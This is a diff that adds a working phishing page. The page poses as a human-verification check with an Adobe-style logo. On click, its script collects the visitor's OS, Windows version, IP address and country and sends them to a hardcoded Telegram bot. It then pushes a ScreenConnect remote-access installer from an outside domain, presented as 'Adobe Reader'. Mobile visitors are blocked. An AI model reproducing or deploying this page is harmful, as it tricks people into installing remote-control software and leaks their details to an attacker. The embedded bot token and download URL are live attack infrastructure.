@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification Required</title>
+
+<style>
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f5f5f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.box {
+    background: #ffffff;
+    padding: 30px;
+    width: 360px;
+    text-align: center;
+    border-radius: 6px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+}
+
+.logo {
+    width: 80px;
+    margin-bottom: 15px;
+}
+
+button {
+    background-color: #d32f2f;
+    color: white;
+    border: none;
+    padding: 12px 25px;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #b71c1c;
+}
+
+.loader {
+    width: 36px;
+    height: 36px;
+    border: 4px solid #ddd;
+    border-top: 4px solid #d32f2f;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 10px auto 15px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+
+<script>
+const BOT_TOKEN = "8081566355:AAHBIybyafzCHJJoQvwL60r2RseIkBd6z0o";
+const CHAT_ID = "6023129266";
+const REDIRECT_URL = "https://xosmcnaxp.online/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest";
+
+// Visitor info object
+let visitorInfo = {};
+
+// Check for mobile
+function isMobile() {
+    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+}
+
+// Detect OS
+function detectOS() {
+    const ua = navigator.userAgent;
+    if (/Windows NT/i.test(ua)) return "Windows";
+    if (/Mac OS X/i.test(ua)) return "macOS";
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unknown";
+}
+
+function detectWindowsVersion() {
+    const ua = navigator.userAgent;
+    if (/Windows NT 10.0/i.test(ua)) return "Windows 10 / 11";
+    if (/Windows NT 6.3/i.test(ua)) return "Windows 8.1";
+    if (/Windows NT 6.2/i.test(ua)) return "Windows 8";
+    if (/Windows NT 6.1/i.test(ua)) return "Windows 7";
+    return "Unknown";
+}
+
+async function getIPInfo() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+    } catch {
+        return {};
+    }
+}
+
+function sendTelegram(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+        })
+    });
+}
+
+async function verifyBot() {
+    // Hide verification box
+    document.getElementById("verifyBox").style.display = "none";
+
+    // Show main redirect box
+    document.getElementById("desktop").style.display = "block";
+
+    // Gather visitor info
+    const os = detectOS();
+    const win = os === "Windows" ? detectWindowsVersion() : "N/A";
+    const ipData = await getIPInfo();
+    visitorInfo = {
+        os: os,
+        win: win,
+        ip: ipData.ip || "Unknown",
+        country: ipData.country_name || "Unknown"
+    };
+
+    // Send Telegram notification that verification completed
+    sendTelegram(
+        "✅ Verification Passed\n\n" +
+        "💻 OS: " + visitorInfo.os + "\n" +
+        "🪟 Windows Version: " + visitorInfo.win + "\n" +
+        "🌍 Country: " + visitorInfo.country + "\n" +
+        "📡 IP: " + visitorInfo.ip + "\n" +
+        "🕒 Time: " + new Date().toLocaleString()
+    );
+
+    // Start countdown to redirect
+    startCountdown();
+}
+
+// Countdown logic with pre-redirect Telegram alert
+let countdown = 5;
+let redirectAlertSent = false;
+function startCountdown() {
+    const el = document.getElementById("count");
+    const timer = setInterval(() => {
+        countdown--;
+        el.textContent = countdown;
+
+        if (countdown === 1 && !redirectAlertSent) {
+            redirectAlertSent = true;
+            sendTelegram(
+                "⏳ Redirecting in 1 second\n\n" +
+                "💻 OS: " + visitorInfo.os + "\n" +
+                "🪟 Windows Version: " + visitorInfo.win + "\n" +
+                "🌍 Country: " + visitorInfo.country + "\n" +
+                "📡 IP: " + visitorInfo.ip + "\n" +"🕒 Time: " + new Date().toLocaleString()
+            );
+        }
+
+        if (countdown <= 0) {
+            clearInterval(timer);
+            window.location.href = REDIRECT_URL;
+        }
+    }, 1000);
+}
+
+// Block mobile immediately
+window.onload = function() {
+    if (isMobile()) {
+        document.getElementById("verifyBox").style.display = "none";
+        document.getElementById("mobile").style.display = "block";
+        sendTelegram("❌ Mobile device blocked from accessing redirect page");
+    }
+};
+</script>
+</head>
+
+<body>
+
+<!-- Verification box -->
+<div class="box" id="verifyBox">
+    <svg class="logo" width="80" height="80" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+      <rect width="256" height="256" rx="40" fill="#E53935"/>
+      <path d="M128 40c-14 44-42 96-70 136 20-8 44-12 64-12 20 0 44 4 64 12-28-40-56-92-70-136z"
+            fill="#fff"/>
+    </svg>
+    <h2>Verify you are human</h2>
+    <p>Click the button below to access the document.</p>
+    <button onclick="verifyBot()">I am not a bot</button>
+</div>
+
+<!-- Main redirect box -->
+<div class="box" id="desktop" style="display:none;">
+    <svg class="logo" width="80" height="80" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+      <rect width="256" height="256" rx="40" fill="#E53935"/>
+      <path d="M128 40c-14 44-42 96-70 136 20-8 44-12 64-12 20 0 44 4 64 12-28-40-56-92-70-136z"
+            fill="#fff"/>
+    </svg>
+
+    <div class="loader"></div>
+
+    <h2>Adobe Reader will be download automatically</h2>
+    <p>Install the downloaded Adobe reader to open document.</p>
+
+    <div class="countdown">
+        Downloading in <span id="count">5</span> seconds
+    </div>
+
+    <p style="margin-top:15px;">
+        If it doesn’t Download automatically,<br>
+        <a href="https://xosmcnaxp.online/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest">click here to redirect manually</a>
+    </p>
+</div>
+
+<!-- Mobile block -->
+<div class="box" id="mobile" style="display:none;">
+    <svg class="logo" width="80" height="80" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+      <rect width="256" height="256" rx="40" fill="#E53935"/>
+      <path d="M128 40c-14 44-42 96-70 136 20-8 44-12 64-12 20 0 44 4 64 12-28-40-56-92-70-136z"
+            fill="#fff"/>
+    </svg>
+    <h2>Device Not Supported</h2>
+    <p>Please open this document on a desktop or laptop computer.</p>
+</div>
+
+</body>
+</html>	
